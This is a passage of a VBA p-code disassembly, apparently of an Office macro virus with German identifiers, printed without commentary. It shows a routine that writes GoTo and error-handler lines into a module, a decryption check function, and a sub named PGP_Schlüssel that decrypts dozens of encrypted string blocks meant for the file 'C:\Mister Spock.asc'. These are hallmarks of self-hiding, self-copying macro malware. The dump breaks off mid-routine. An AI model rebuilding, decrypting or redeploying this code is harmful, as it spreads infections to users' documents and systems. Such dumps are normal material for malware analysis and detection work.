' Line #554:
' 	LitStr 0x0015 "On Error GoTo DcJ7WD5"
' 	LitDI2 0x0018 
' 	ArgsSt Modul23 0x0001 
' Line #555:
' 	LitStr 0x0006 "Return"
' 	LitDI2 0x0019 
' 	ArgsSt Modul23 0x0001 
' Line #556:
' 	LitStr 0x000C "GoTo MStoLEX"
' 	LitDI2 0x001A 
' 	ArgsSt Modul23 0x0001 
' Line #557:
' 	EndSub 
' Line #558:
' Line #559:
' 	FuncDefn (Public Function TestCodierung(ByVal Txt As String) As Boolean)
' Line #560:
' 	Dim 
' 	VarDefn TestStr (As String)
' 	VarDefn x (As Byte)
' Line #561:
' 	LitVarSpecial (False)
' 	St TestCodierung 
' Line #562:
' 	Ld Txt 
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	St TestStr 
' Line #563:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld TestStr 
' 	FnLen 
' 	For 
' Line #564:
' 	Ld TestStr 
' 	Ld x 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x007F 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #565:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #566:
' 	LitVarSpecial (True)
' 	St TestCodierung 
' Line #567:
' 	EndFunc 
' Line #568:
' Line #569:
' 	FuncDefn (Public Sub PGP_Schlüssel())
' Line #570:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0078 
' 	VarDefn ASCModul (As String)
' 	VarDefn x (As Byte)
' Line #571:
' 	Dim (Const) 
' 	LitStr 0x0013 "C:\Mister Spock.asc"
' 	VarDefn DateiName
' Line #572:
' 	OnError fehler 
' Line #573:
' 	LitStr 0x0024 "â¿Â³ýîäùÉÂÓ“ÏÄêÊøÛü¢õ€‰öä×éËÍÌš¾¸Í¼‰"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0000 
' 	ArgsSt ASCModul 0x0001 
' Line #574:
' 	LitStr 0x0058 "™÷�í¹ÃÏ„ Ü´“îæ¯ÿÚøÂŽ––ì†“Æ‹Îìûÿ³ó�ã„èòƒÒ«ëìÕ¥ÿ‘�¬Ø«™ÔÊìÅ£ë„Õ�”�ïÍ�¾ë†Øœ‹ú�ÍÈÓÝþŒŒËïŸ‰¼Ñ¢"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0001 
' 	ArgsSt ASCModul 0x0001 
' Line #575:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0002 
' 	ArgsSt ASCModul 0x0001 
' Line #576:
' 	LitStr 0x0040 "¢Ã¨÷’èÉËÒÞ²‘ÊÕŽÌøúÒƒÓè�ø‹ºæòæþè¤¾¬ëòÓëš½’ãÖú¶â‘€¿ÿí™Åÿ”›®ÚÄÓöÁÑé"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0003 
' 	ArgsSt ASCModul 0x0001 
' Line #577:
' 	LitStr 0x0040 "·ç«±ˆüìÓåâ£‹û§ˆÎþÛ‚‰ØÖ…ÇÜÄÊÒ¶ë¼Òò•ÜÑÓ®¼¨¯âôî•Å·ÚúÜÜ¨“œ€ÀúÓÆÀ‡Õ“Ù"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0004 
' 	ArgsSt ASCModul 0x0001 
' Line #578:
' 	LitStr 0x0040 "ö¹¾ÿ�ƒùùÃÝº­ÏÐóÊìøþ¡àÅ°‹’‡ß÷íí™ãÀ˜ÜÑ¿¥™Ž®µÕ�ë¢‘Ÿ¨Ü¼®áý�ˆ¦Î³Â˜Ž”Þ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0005 
' 	ArgsSt ASCModul 0x0001 
' Line #579:
' 	LitStr 0x0040 "ÿê¬í–ßÍñÔ¼ª³Ùú«ûÞéÆ¦†ê�÷’¥âÖÏë›ðçÓëôöÔ�”¬Òª—ë¾˜¸˜‡ÇßÏœ›¿±Ý¸êü‚šª"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0006 
' 	ArgsSt ASCModul 0x0001 
' Line #580:
' 	LitStr 0x0040 "©Ç¤íž�Ì�èÈ¶õæ¢£íú«ÕœàÈúÔÿ›ÄÆ»·•ÙÔ„û•Ãë¾«±Ýä�§ÝÝ€ �É®Áâü”ž§œÒ‚ŠËß"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0007 
' 	ArgsSt ASCModul 0x0001 
' Line #581:
' 	LitStr 0x0040 "§û¸Ú…›êØæü¼óÄùýÓÌøø¹ÕÉºÚÄÀãòºè™àÀÓÄ‹ÐÌ¨¼§ÒìÓ‚ë»¸§ñíœÑÈ•‘±Úµö€ÔúÜ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0008 
' 	ArgsSt ASCModul 0x0001 
' Line #582:
' 	LitStr 0x0040 " ÜÀù‘ƒ˜ÓÇÀ¿„ÑÖ»ØËÑÖƒ€ò”âŒ–øËÌûƒ£Á±åËë¶¾È²üû�«»—²�Ý½ªÓõ�Ÿ½ú©ÄäˆéË"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0009 
' 	ArgsSt ASCModul 0x0001 
' Line #583:
' 	LitStr 0x0040 "�ÓÞ¨“•–†èÊ�ôý¬Œþÿ©ê£Ä‘¦ëä±îóÍæ•ÙúÒãå÷Ä¾…Šõêì´Ç½ÞŒóþš’ù©®†«’ÊóŠÖï"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x000A 
' 	ArgsSt ASCModul 0x0001 
' Line #584:
' 	LitStr 0x0040 "½ê—ïááâêÐô‘ æüÿ¬ÉÍéºðÙéýäšíëì»‡êì�ÓÞ¾ùµ›ºôàˆˆÎÝ²�ÐÃ£äÙô¸ŠÞÇãöéãÙ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x000B 
' 	ArgsSt ASCModul 0x0001 
' Line #585:
' 	LitStr 0x0040 "ŽÃªß‘íàÿÁÍ²‚ÉÕ‹ÛìØôÄ„ðíÔüµéÌÐä½ÔÔ¡ÔæÇÜ¬½‰ÅÄù�ÝÝŠŒñÆ­äÈ¯±ˆÞ“âôÜÅÑ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x000C 
' 	ArgsSt ASCModul 0x0001 
' Line #586:
' 	LitStr 0x0040 "ŒÓœÕ“ËÒñÇÎ²ŒÌÅúÕåËå¼óò¥ÙõŽþìËçéúÜ³ÈÖÈäÕ’ƒÐÐÈ‰Þ»ŸœàÎÜèû¿Ò›õÄÉûÐðÒ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x000D 
' 	ArgsSt ASCModul 0x0001 
' Line #587:
' 	LitStr 0x0040 "žè—×žÖ‘•Ï£Ü¡ÉÑ‡ØîþÃ§òÇòüõµêÖÊË¢üÜ‰ö“ÉçžÈ‡þò��÷�ß‚ÎøÛèÕ¿Î„åƒ’øÁÑ¯"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x000E 
' 	ArgsSt ASCModul 0x0001 
' Line #588:
' 	LitStr 0x0040 "€èœ©ŸÖÒ‰Ïö€ôÇî¹­âãÃÜùÚ±„ò�Ø°Íõ¢¤Úšâ“É²Â¾‰ÆÄñ�Ç³©¨õÆ®îÈ�ºŽÎµáòêê·"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x000F 
' 	ArgsSt ASCModul 0x0001 
' Line #589:
' 	LitStr 0x0040 "·Ó®ø‘íàüÂÝ¶�ÉÅ�ØìÈñª÷áƒòü¶êÆÃÞ˜××¡ÄãÄêŠµ‹ã÷—¸Ì±ÙˆõÊ¯æþ�½Šø¡áõê÷Ý"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0010 
' 	ArgsSt ASCModul 0x0001 
' Line #590:
' 	LitStr 0x0040 "�Ó®ß‘ô‘üÁë¾‚ÊÖ�Üèðõ“çñ›çè îÏËá”ÆØ�ÖöéÌŠ•™öÉú†Û¾ºõ÷Ú–þÁ‡ºˆÎŸòñÃÅÂ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0011 
' 	ArgsSt ASCModul 0x0001 
' Line #591:
' 	LitStr 0x0040 "ˆûºóšÕÆÎËæ¢òÆþ©®âÍÀ¯äå”ôïÇÃÍÑãŸÆÃ¶ËüÑÛ�ž‘¶ÓÔšà–‡¬ãû–ÃçšË¯¬˜�ÒÔíÝ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0012 
' 	ArgsSt ASCModul 0x0001 
' Line #592:
' 	LitStr 0x0040 "§ËŽÖ¹åÌõëü¼–äÎ«ÂÀÓÝŠÙÑ�ØÍ–ÊéóÄ¼âæ’Þ”òÿŒÌ½ÈìŽ·þ¢­µ×é¤Þâ¢²ûë ð†ßÀÀ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0013 
' 	ArgsSt ASCModul 0x0001 
' Line #593:
' 	LitStr 0x0040 "ýÜ�ÿäÉíÔµÃ«®½¿ ê›ïø’Ž�–‚„�Í³©é£¼í¡ÐÂÇÌ¬»‰ÕÄú�Ü·ªŒåÎ®æî�¸ŠÞ±äöêëÜ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0014 
' 	ArgsSt ASCModul 0x0001 
' Line #594:
' 	LitStr 0x0040 "�ÓºÙ’ÛÆôÃë…ìðÕ‰«èÈñ¨÷ñ‹öÿ¶æÂÀø„Ö×¡ÐæÇóŽ¾‰ÕÈü…Ü£®„àÎ«âÄŠ«‰­¶ÝòÂëá"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0015 
' 	ArgsSt ASCModul 0x0001 
' Line #595:
' 	LitStr 0x0040 "¨ÃˆË�ÜæÖóï¶‰Áî„É•Ûæ‚ÕÔ‡øûžú·¶Ü‰ëÓ˜öþÁô´‘ƒÇêÉŽÙ«Û‚ðàÚöŸž¿™ô”ìäîÒÌ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0016 
' 	ArgsSt ASCModul 0x0001 
' Line #596:
' 	LitStr 0x0040 "™Ô¹É†�Éä×á½¨ÒÃ�ôÌÞÜšÕ“�‚Ù™Ï³ç× ÐòÔÂâîòˆ¶¡Ýðë«¸¡¾¡ÄîµÊõ½�¤©£ÉÇÊÇ÷"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0017 
' 	ArgsSt ASCModul 0x0001 
' Line #597:
' 	LitStr 0x0040 "¾óžç£›ò�ôþ–÷ýö¸ÙÚ¡ä­ÎÓ¤úÄ”ÙÔ²¶…Å¤”÷ý´ùŸ–ü¯ÕÔõø”‡ûÑù•Ÿ€˜Èòé–‘œÝÐ·"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0018 
' 	ArgsSt ASCModul 0x0001 
' Line #598:
' 	LitStr 0x0040 "ýõ®Ó‘ÛäÿÁä¶‡ÍÅ‹µìÉ÷Šýë‰òþžÂàÃäéÆÔ¦×óîÿ¦‘ãñã�¶º•˜©ÅùÕ–Î�°žëÅýçø�ö"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0019 
' 	ArgsSt ASCModul 0x0001 
' Line #599:
' 	LitStr 0x0040 "œ½µÆéþôÊÌù’¤ËÒ¸Íûÿ„�…�³ýÑ¼ßóËø°åúšóÂë¶Û‹ŒýîŽ÷Õ˜¾»�ùÇ�ü�ƒºÔ…öàÒÛú"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x001A 
' 	ArgsSt ASCModul 0x0001 
' Line #600:
' 	LitStr 0x0040 "¡æ›ä’Éöìöú¿ìÉÝûÎÝþö­ðæƒñï¥ùÖÃÙ³¸âÓÛ”¿ïÙ¶®÷øÁ©Ä„ÇŒøÑ´ÃÅõ²¹î€üÐÿÓÌ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x001B 
' 	ArgsSt ASCModul 0x0001 
' Line #601:
' 	LitStr 0x0040 "—ý·÷ªþÍŽÈû¹™ßÖƒ×ßÍü¥ø�´ßØ–ÒöÔÙ“ëÿÓßí×¨‚Š�Ý¹Ž÷¼”œ��Æ¦É×ôÎƒþžŽÍ�Ïé"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x001C 
' 	ArgsSt ASCModul 0x0001 
' Line #602:
' 	LitStr 0x0040 "žÇœé‘ëòß¶áÃóÌ£�õ�©ˆ³Ìó²‹Ô†Ý¬ø éÒÓ¶Ä‘þú™­™ìÊÝ¸ÛÂ¼œþïŽÆù•›¦¬¤ÿ˜ø•·"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x001D 
' 	ArgsSt ASCModul 0x0001 
' Line #603:
' 	LitStr 0x0040 "ŽÖ¡±¥ÞöÄ¯û²ˆ¿¥š¯úÎçØïÔí×Ž¡Òæñ·…¤ã�ÃÈôò¡·°ìð€„Ä„Ú½ìÝ¼ÒÝ‡Œü°ÇîÄðÓê"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x001E 
' 	ArgsSt ASCModul 0x0001 
' Line #604:
' 	LitStr 0x0040 "­åµî’œŽÊï¾¿¡¼õùÎ‚îô£ÎÅˆöÛÎÇÐðÞ¸¸Ó�åœüü�ÐŒ«Åþïú¶²›Çî«ˆè‰®¿ÑÉÈÂÔ“ñ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x001F 
' 	ArgsSt ASCModul 0x0001 
' Line #605:
' 	LitStr 0x0040 "ºæÜç¢ÙŠè¯û·§úåûóÿÏƒ¦Ã’´ÿÌ®ÁÂÓã°Á§˜þ”öÏ˜•±þÔÞ¨øÃ™þŸâÚÀÝãµò®ŸÈ˜ÌæÂ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0020 
' 	ArgsSt ASCModul 0x0001 
' Line #606:
' 	LitStr 0x0040 "®§–ªèàÀÌÅ§Â�Òä²µÈËçÄ�Í°Ç’°ûíçØ©æû“õéÔÜÛÐ„ÎÊÁ÷þ”€•öÓ�ÑÎ¾Ÿäè´í†ÝØ×"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0021 
' 	ArgsSt ASCModul 0x0001 
' Line #607:
' 	LitStr 0x0040 "¹«Üø¤ôŽÈìíÄ°Ç¬˜Ñý×ùÞ€Ñ­Ã�¥øâÉØãæÒ² þÌÈ�Ê¤«èï­¾·±¨ö¾‹Êž  ‰ó¨Õ„ŽÐÎ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0022 
' 	ArgsSt ASCModul 0x0001 
' Line #608:
' 	LitStr 0x0040 "ÿô˜©¡ëÒð¯ãË—ÂÒåÜæàŸ§áÊ³€Õ®�Óòõ¨ÐÏ�Éý±Ê��ãÍ®íƒøœÚôúØÙë™¡º£ÕˆÐÔãðÊ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0023 
' 	ArgsSt ASCModul 0x0001 
' Line #609:
' 	LitStr 0x0040 "™ÿ˜êšà“•èøªµþî¿ëé¡ÑØûÉ±ÒöÀï³èØºÅý‘¨ÎÜå¡—�ÈÂö†¢¼™†ÙÆÇý÷‡’¾ÉÂèÿêëî"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0024 
' 	ArgsSt ASCModul 0x0001 
' Line #610:
' 	LitStr 0x0040 "€ª¾¨²êËÚõùœ»â»­Ëß©ÆßÆìíË÷“ÜÏºÜþ¸ý¶¤Ð²ø˜™»êèó·ã¾ªœØò„ëáüºþª‚”˜Ìãû"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0025 
' 	ArgsSt ASCModul 0x0001 
' Line #611:
' 	LitStr 0x0040 "˜ÊÝ­§ŸÂÏåÜ˜ðêâòÛÉ²ÒÄ÷î®ÁÇ”óËî÷—Ýæ×Üëô­��ðÒò—ëÝŸ¢§„Ý˜”š¯ÈýÉÄëÃ‰úÉ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0026 
' 	ArgsSt ASCModul 0x0001 
' Line #612:
' 	LitStr 0x0040 "™È›èªãÛò¯ùÂöþÕ ÈÙÐÈ³×öšûˆØ“Æ°À°ªÂØÚ–±Ìˆ¸üà®Á³ôÅ™»üò˜ôå»’¯È¤ŠöõÎÏ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0027 
' 	ArgsSt ASCModul 0x0001 
' Line #613:
' 	LitStr 0x0040 "ýâœç„ûØóö§Ä¶º¥³±Øüò‡ÂÍú�Ž›™Ìøéµõ¾§äÔëéØ§øêÔ�±ÇÇŒõñØŸÖ×‚�©ª�ŠŽ×‰¡"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0028 
' 	ArgsSt ASCModul 0x0001 
' Line #614:
' 	LitStr 0x0040 "—ÖÙÉ¼�ÂŒóö èëî»¨š¬Æ�àÈ“†Œ¿Å²ëÿ„æô¶ûý¾ÔÆ·ùðåà©ãžŽ·ìâŽÄÞ¾Àùé¤�âÐ‰¯"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0029 
' 	ArgsSt ASCModul 0x0001 
' Line #615:
' 	LitStr 0x0040 "º¹¹ïäƒÖÔÙß¹†¹íåàæàŸ§îÅ„å…Ÿìµ­ê†æÙ¥Çëãÿ˜›©îÆý–Ëº„…Ý¸›Éšç�²å‡ßœíäÔ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x002A 
' 	ArgsSt ASCModul 0x0001 
' Line #616:
' 	LitStr 0x0040 "÷è‰Ò¥‡ÀÎÎÈË„¾Æ«àßÉÔ˜‡�ñ‹ö�“ÆÉãµûä“Â—êå¡½»¯ÛÜ²Áª ûÀíßòé¹Ö ç�ÏØÉÀì"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x002B 
' 	ArgsSt ASCModul 0x0001 
' Line #617:
' 	LitStr 0x0040 "ù¥›ðÿÛàë±í„±¹Î²¯èîÜƒ‚Ã´ãäÀß×ÎæƒÅÆ®×ðä¤Ü©ºéÑýøÞ¢˜©…³žÁåôÖäù¼ÇÆÒšÛ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x002C 
' 	ArgsSt ASCModul 0x0001 
' Line #618:
' 	LitStr 0x0040 "ùà‰ÆûÂ’ÜúßÜ¢Îà¦©ÙÜÁÄûÑíËß‘“Æ¶â£Üå•å•Çª¼ŒºüÕÀŽù¨ŽùÅã¹ýŸ­•ùÆ¡”çüÒÑ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x002D 
' 	ArgsSt ASCModul 0x0001 
' Line #619:
' 	LitStr 0x0040 "µÔ¤ç˜ÝÑÆØÖÜ‡ÜÆøìÙÿˆªÂ—­Õôƒý¬» ¥ýåÏÆÑÞè¤·¦ïéâ†¦–Ç¦ä³­ÑããÀ¡ë‚—ÕÌÀè"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x002E 
' 	ArgsSt ASCModul 0x0001 
' Line #620:
' 	LitStr 0x0040 "ŠÅƒÿ†ÎÖÖôö—›ÒñÿÊúïç“ÚÂð×ñÆäáÆ¿¤òñËéÓÎå»…çóÀò¡ø¥¬«‚À�éÙ®•ºÔ‚Šöùïö"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x002F 
' 	ArgsSt ASCModul 0x0001 
' Line #621:
' 	LitStr 0x0040 "÷¡—î³ÞŽÄùÞµì°ðùüœöÂ‰ò�µúØŸÃÐ©Á¼É¡³âæ÷û„–¿ðÂ×šÉ¾�”ú¸ºÁÂ®ÀŠþÉÐ†Íûõ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0030 
' 	ArgsSt ASCModul 0x0001 
' Line #622:
' 	LitStr 0x0040 "¤è¢¨çÇ÷ù³À†±ðÐ½êÜÚÑ³‚Í±ÑÄ¥ØÎè»ˆ¸ò©£‹·ïßÉ©àãÉ‚áÀ™´ùýßÖ—º´àýÂÖÒÃ�¬"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0031 
' 	ArgsSt ASCModul 0x0001 
' Line #623:
' 	LitStr 0x0040 "�÷Ø×èåõ‡·è¹…§×°ëÛ²�³ÄÄ»„�“ÌôÔý¥ äŽèÕµ®»�²îÙ�–é¿ÐŸÍù©Ö˜Š�“Í¦òÁïÐÌ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0032 
' 	ArgsSt ASCModul 0x0001 
' Line #624:
' 	LitStr 0x0040 "øÜžÐ¾èîÌâà—•º£»èåÍÆ¬óÕªÃÕ§ÏëÈÂ¨ç×³©—Õå¿¯ƒ«ìÌµè¤ž¡âæžþÈô²œèž�œ�Îý"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0033 
' 	ArgsSt ASCModul 0x0001 
' Line #625:
' 	LitStr 0x0040 "««Ü­—Î”è¯û·ªù¤øÉæãÙ³ì�ñ‚ë¼ž¶ØÖ˜þÏ–üü­ÕÂžºþ÷Ú“æÝŒ�æÞŽÕþý°©þ¿ïñéä³"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0034 
' 	ArgsSt ASCModul 0x0001 
' Line #626:
' 	LitStr 0x0040 "ö½«É¤”ØÑõ¹‚÷ùÐ’ÀáÚÕØØ‘Ž†å‚ÛÑÑÅ·§À´º�ÞÊ™™Ÿ¶°ïø¼–žæÍº¸ÞÖž€úÆ‰�Þ×ÄÔ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0035 
' 	ArgsSt ASCModul 0x0001 
' Line #627:
' 	LitStr 0x0040 "ˆæÞèãàÔÚæà�‹¹ÐžÊÙÉÊ Çî´˜……çÒ÷þ°çåµ¨”ÊÊØ‘ŸÎì“ô¾Ê»¹à¼«Âù‹®ˆ«’Ã˜ØÎ·"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0036 
' 	ArgsSt ASCModul 0x0001 
' Line #628:
' 	LitStr 0x0040 "¹£¿è‚•”öÔÏÅªÒ­ À×¯ù˜ÅÄªôÖ´Ò¨ä½¡ª£‘Á–çÊ®Ëªå÷“ªþÀÑ¡âí™Ó€¿ÖüÑ”ÌÎéÔ "
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0037 
' 	ArgsSt ASCModul 0x0001 
' Line #629:
' 	LitStr 0x0040 "½ôŠï¦È“ûÔÞ¸ºú­ù±šÏâ“ó•¤öäŽÈÏ²ßšßÁ²¾é¾ü¾Í„âÏþ¶ìªŠâÇ¤‰Õžª­¤ò™ñÔ”šÙ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0038 
' 	ArgsSt ASCModul 0x0001 
' Line #630:
' 	LitStr 0x0040 "Œä×ßãÖùÓíâÀ—Æ¬˜ôÏûÄ³ÕÙ¤Š…Æ˜Èñ¤˜ñ÷±¨îëèƒÍ»óÙÙ©ï„ž£ÇÀÛÄù¶È�Î˜�ðõêô"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0039 
' 	ArgsSt ASCModul 0x0001 
' Line #631:
' 	LitStr 0x0040 "¥Ñºô©øÙÐåÈ¦“Îá¥àäÔñ¸�ðúòË�Éá­Õ°ØíªËãêñ‰Ìþ÷âÕ©û”˜µ�ÒœïÄŸŸ†¨›ÃÒÎ“ "
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x003A 
' 	ArgsSt ASCModul 0x0001 
' Line #632:
' 	LitStr 0x0040 "„÷£îääÈŽ¶¹‰ˆø¿�Ð•¶ý�ÙëöÂÍ¾ó¿÷Õ™éÿ�æêÜËŒœ©ïäï’é½‹¢çþ†ÖÉŠ’óÉÁÁÀˆ’Ô"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x003B 
' 	ArgsSt ASCModul 0x0001 
' Line #633:
' 	LitStr 0x0040 "­þ‹úºÊ–òÌÔ¡èÉæû¨�ìÑ¡ÚÂ˜ò–Âüöí¤¸ÂÍÐÇ�Ä¤•Í£·Ë—³ùªºæó²«ˆÜºª‰ý’Ñ�ÈÈú"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x003C 
' 	ArgsSt ASCModul 0x0001 
' Line #634:
' 	LitStr 0x0040 "¡ÜŠÈ¹çÍî²Üº¦à×�öú¬ÚºÛÕ´ãÚÅÛ¿ûû‡ÐÞ¤¦ðÖØ—™«îäÊ²ÚÂ‹ˆüçžŸÚþˆ¸Ï‰ëñÏ‰ú"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x003D 
' 	ArgsSt ASCModul 0x0001 
' Line #635:
' 	LitStr 0x0040 "¬¥¹«±œ“î×ü ú¸ûáÑßÏ‰¹‡ëºÚåÀÚÉ÷íþ÷çª Õ°ëÕ¾›³ñÞŠÜ½‚¿ÁÓ�”œ­Î¢«¦òáÝÎÀ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x003E 
' 	ArgsSt ASCModul 0x0001 
' Line #636:
' 	LitStr 0x0040 "«½Šì¾ÈôÊöø¤±Ãùù¯ûËÁØÙ‘¦ßñ˜áÖ·¾¾Åº—ÕÌÎ¯Ü·šÝóÕšûÊ©ž‡ÓŠÑÝ­É…ª ÖôêúÐ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x003F 
' 	ArgsSt ASCModul 0x0001 
' Line #637:
' 	LitStr 0x0040 "™ÕÝ¯²œ˜Ó¯ÿ†‰ìâ°Ö•íàŽüõš†ëÅß¾µ ´áÞ�ÇÈÊ®º»ñ·²ì‘Þ¤Ž†‡ÇÕ’Î¾Ê�«Šî„�Ø·"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0040 
' 	ArgsSt ASCModul 0x0001 
' Line #638:
' 	LitStr 0x0040 "ŽÚŽï‡Ç–õúÞÄµýà™©ÌëÅ¼øæ”äßÂÆõÉÄè§íŒÖïÖÓÂ»øïê—©èÅž‹ìèŠÉÍù�òï�ßçüä¯"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0041 
' 	ArgsSt ASCModul 0x0001 
' Line #639:
' 	LitStr 0x0040 "ƒñŽ®èàòÍùû±•Þòýìå×Ô›Ù’¨Ë–¿™ñàöåÿÃ‹Ëóà¨»Ôþðäâóá…ÑúÑß´ë€©•¯ñ ‘ÚÍÍ®"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0042 
' 	ArgsSt ASCModul 0x0001 
' Line #640:
' 	LitStr 0x0040 "‰âÞÖžÎéÕÖÖ�¯ÆÅ�«ëßö�ÎØªâò˜ÄèíÎèÊ¥ÑÇÑÈÐ™‘ðò¹ùðåÆ­—Ú¤šÁä¸›…ó“ÑÃíÆ«"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0043 
' 	ArgsSt ASCModul 0x0001 
' Line #641:
' 	LitStr 0x0040 "üô™ü¡™×Éðþ¦•òû�ÿøñê§ýê—×ÛÀ˜¾³ùéÒãŒðÏ¾ÓÛ–ù¯õˆ²ë—ºô‡¤­ð€µÈ­Ï¦“âÎÃÀ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0044 
' 	ArgsSt ASCModul 0x0001 
' Line #642:
' 	LitStr 0x0040 "¤÷™Í¾Éêñêù»•çù�ìÁªÖ�ÇÐ àÌÆ›ôÑþ§êç•àÜÍç�›ºâùôïú±‘üØê¾è�þ˜þ°Å“çÏú·"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0045 
' 	ArgsSt ASCModul 0x0001 
' Line #643:
' 	LitStr 0x0040 "ŽÛ«ÆžëñËóµ°†úÝüÖ××€šÄÔéÑˆ–Ó´î×ú£û„ç�ðñœ‡ŽàÏ€ºº„Û»ŒÅ¾ðŸ„Ë¦û�Ã‚ðëÉ"
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	LitDI2 0x0046 
' 	ArgsSt ASCModul 0x0001 
' Line #644:
